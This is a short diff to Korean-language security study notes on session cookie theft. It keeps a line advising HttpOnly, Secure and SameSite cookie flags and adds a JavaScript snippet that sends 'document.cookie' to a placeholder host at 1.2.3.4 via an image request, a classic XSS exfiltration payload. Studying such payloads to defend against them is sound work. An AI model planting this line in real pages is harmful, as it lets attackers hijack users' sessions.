@@ -534,6 +534,10 @@ PW: test
 
 **방어법**: 세션 쿠키 발급 시 `HttpOnly`, `Secure`, `SameSite` 속성을 함께 설정.
 
+```
+new Image().src = "http://1.2.3.4/steal.php?cookie=" + document.cookie;
+```
+
 <img width="1079" height="1032" alt="스크린샷 2026-06-25 172401" src="https://github.com/user-attachments/assets/0be27b85-f31b-4781-b9f2-5c89876046c8" />
 
 
